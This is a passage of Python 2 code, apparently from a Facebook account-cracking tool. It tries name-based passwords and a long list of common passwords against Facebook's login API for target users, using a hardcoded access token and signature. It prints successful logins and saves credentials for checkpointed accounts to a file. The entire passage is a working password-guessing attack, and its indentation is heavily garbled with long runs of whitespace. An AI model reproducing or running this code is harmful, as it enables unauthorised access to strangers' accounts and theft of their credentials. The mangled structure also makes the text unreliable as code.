																											                                                                                                                                        		                                                                                                                                       	       	                       	           	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass33 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                                                	                       	                          	      	cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                                                	                       	                          	       	cek.write(user+"|"+pass33+"\n")
																										                                                                                                                                        		                                                                                                                		                       	                           	      	cek.close()
																										                                                                                                                                        		                                                                                                                	                       	       	                       	        	cekpoint.append(user+pass33)
					 																					                                                                                                                                        		                                                                                                                	                       	                                 	else:
 																					                                                                                                                                        		                                                                                                                	                                	                       	                                 	        pass34 = b['first_name'] + b['last_name']+12345678
                                     																					                                                                                                                                        		                                                                                                                                                	                       	        		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass34)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				 																					                                                                                                                                        		                                                                                                                	                                  	                           	    	q = json.load(data)
																										                                                                                                                                        		                                                                                                                                                	                          		if 'access_token' in q:
																									                                                                                                                                        		                                                                                                                		                                	                             		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass34 + ' - ' + b['name']
																										                                                                                                                                        		                                                                                                                	                                	                          		oks.append(user+pass34)
																										                                                                                                                                        		                                                                                                                                               	                       	                        else:
																										                                                                                                                                        		                                                                                                                	                                	                             		if 'www.facebook.com' in q["error_msg"]:
																											                                                                                                                                        		                                                                                                                	                                	                         		print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass34 + ' - ' + b['name']
																											                                                                                                                                        		                                                                                                                                                	                          			cek = open("sg/ok_cp.txt", "a")
																											                                                                                                                                        		                                                                                                                	                                	                          		cek.write(user+"|"+pass34+"\n")
																											                                                                                                                                        		                                                                                                                                                	                         			cek.close()
																											                                                                                                                                        		                                                                                                                	                                	                            		cekpoint.append(user+pass34)
					  																					                                                                                                                                        		                                                                                                                	                                  	                       	       	        else:
 																					                                                                                                                                        		                                                                                                                	                                	                       	                                 	                        pass35 = '786786'
																							                                                                                                                                        		                                                                                                                	                                	                       	                                 		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass35)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							                                                                                                                                        		                                                                                                                	                                	                       	                                 		q = json.load(data)
																							                                                                                                                                        		                                                                                                                	                                	                       	                                 		if 'access_token' in q:
																								                                                                                                                                        		                                                                                                                	                                	                       	                                 		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass35 + ' - ' + b['name']
																								                                                                                                                                        		                                                                                                                	                                	                       	                                 		oks.append(user+pass35)
																							                                                                                                                                        		                                                                                                                	                                	                       	                                 		else:
																								                                                                                                                                        		                                                                                                                	                                	                       	                                 		if 'www.facebook.com' in q["error_msg"]:
																								                                                                                                                                        		                                                                                                                	                                	                       	                                 			print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass35 + ' - ' + b['name']
																									                                                                                                                                        		                                                                                                                	                                	                       	                                 		cek = open("sg/ok_cp.txt", "a")
																									                                                                                                                                        		                                                                                                                	                                	                       	                                 		cek.write(user+"|"+pass35+"\n")
																									                                                                                                                                        		                                                                                                                	                                	                       	                                 		cek.close()
																									                                                                                                                                        		                                                                                                                                               	                       	                                 	 		        cekpoint.append(user+pass35)
                          																					                                                                                                                                        		                                                                                                                	                                    	                       	                                 	        else:
pass36 = '123456'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass36)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass36 + ' - ' + b['name']
				oks.append(user+pass36)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass36 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass36+"\n")
					cek.close()
					cekpoint.append(user+pass36)
                                  else:
pass37 = 'password'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass37)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass37 + ' - ' + b['name']
				oks.append(user+pass37)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass37 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass37+"\n")
					cek.close()
					cekpoint.append(user+pass37)
                                  else:
pass38 = '123456789'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass38)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass38 + ' - ' + b['name']
				oks.append(user+pass38)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass38 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass38+"\n")
					cek.close()
					cekpoint.append(user+pass38)
                                  else:
pass39 = '1234567890'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass39)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass39 + ' - ' + b['name']
				oks.append(user+pass39)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass39 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass39+"\n")
					cek.close()
					cekpoint.append(user+pass39)
                                  else:
pass40 = '12345'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass40)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass40 + ' - ' + b['name']
				oks.append(user+pass40)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass40 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass40+"\n")
					cek.close()
					cekpoint.append(user+pass40)
                                  else:
pass41 = '12345678'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass41)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass41 + ' - ' + b['name']
				oks.append(user+pass41)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass41 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass41+"\n")
					cek.close()
					cekpoint.append(user+pass41)
                                  else:
pass42 = 'qwerty'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass42)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass42 + ' - ' + b['name']
				oks.append(user+pass42)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass42 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass42+"\n")
					cek.close()
					cekpoint.append(user+pass42)
                                  else:
pass43 = '1234567'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass43)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass43 + ' - ' + b['name']
				oks.append(user+pass43)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass43 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass43+"\n")
					cek.close()
					cekpoint.append(user+pass43)
                                  else:
pass44 = '111111'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass44)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass44 + ' - ' + b['name']
				oks.append(user+pass44)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass44 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass44+"\n")
					cek.close()
					cekpoint.append(user+pass44)
                                  else:
pass45 = '123123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass45)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass45 + ' - ' + b['name']
				oks.append(user+pass45)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass45 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass45+"\n")
					cek.close()
					cekpoint.append(user+pass45)
                                  else:
pass46 = 'abc123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass46)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass46 + ' - ' + b['name']
				oks.append(user+pass46)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass46 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass46+"\n")
					cek.close()
					cekpoint.append(user+pass46)
                                  else:
pass47 = '1234'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass47)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass47 + ' - ' + b['name']
				oks.append(user+pass47)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass47 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass47+"\n")
					cek.close()
					cekpoint.append(user+pass47)
                                  else:
pass48 = 'password1'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass48)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass48 + ' - ' + b['name']
				oks.append(user+pass48)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass48 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass48+"\n")
					cek.close()
					cekpoint.append(user+pass48)
                                  else:
pass49 = 'iloveyou'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass49)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass49 + ' - ' + b['name']
				oks.append(user+pass49)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass49 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass49+"\n")
					cek.close()
					cekpoint.append(user+pass49)
                                  else:
pass50 = '000000'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass50)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass50 + ' - ' + b['name']
				oks.append(user+pass50)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass50 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass50+"\n")
					cek.close()
					cekpoint.append(user+pass50)
                                  else:
pass51 = '1q2w3e4r'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass51)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass51 + ' - ' + b['name']
				oks.append(user+pass51)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass51 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass51+"\n")
					cek.close()
					cekpoint.append(user+pass51)
                                  else:
pass52 = 'qwerty123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass52)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass52 + ' - ' + b['name']
				oks.append(user+pass52)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass52 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass52+"\n")
					cek.close()
					cekpoint.append(user+pass52)
                                  else:
pass53 = 'sunshine'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass53)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass53 + ' - ' + b['name']
				oks.append(user+pass53)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass53 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass53+"\n")
					cek.close()
					cekpoint.append(user+pass53)
                                  else:
pass54 = 'dragon'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass54)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass54 + ' - ' + b['name']
				oks.append(user+pass54)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass54 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass54+"\n")
					cek.close()
					cekpoint.append(user+pass54)
                                  else:
pass55 = 'princess'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass55)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass55 + ' - ' + b['name']
				oks.append(user+pass55)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass55 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass55+"\n")
					cek.close()
					cekpoint.append(user+pass55)
                                  else:
pass56 = 'zaq12wsx'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass56)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass56 + ' - ' + b['name']
				oks.append(user+pass56)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass56 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass56+"\n")
					cek.close()
					cekpoint.append(user+pass56)
                                  else:
pass57 = 'letmein'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass57)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass57 + ' - ' + b['name']
				oks.append(user+pass57)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass57 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass57+"\n")
					cek.close()
					cekpoint.append(user+pass57)
                                  else:
pass58 = '654321'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass58)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass58 + ' - ' + b['name']
				oks.append(user+pass58)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass58 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass58+"\n")
					cek.close()
					cekpoint.append(user+pass58)
                                  else:
pass59 = 'monkey'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass59)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass59 + ' - ' + b['name']
				oks.append(user+pass59)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass59 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass59+"\n")
					cek.close()
					cekpoint.append(user+pass59)
                                  else:
pass60 = '27653'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass60)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass60 + ' - ' + b['name']
				oks.append(user+pass60)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass60 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass60+"\n")
					cek.close()
					cekpoint.append(user+pass60)
                                  else:
pass61 = '123321'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass61)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass61 + ' - ' + b['name']
				oks.append(user+pass61)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass61 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass61+"\n")
					cek.close()
					cekpoint.append(user+pass61)
                                  else:
pass62 = 'superman'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass62)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass62 + ' - ' + b['name']
				oks.append(user+pass62)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass62 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass62+"\n")
					cek.close()
					cekpoint.append(user+pass62)
                                  else:
pass63 = 'asdfghjkl'
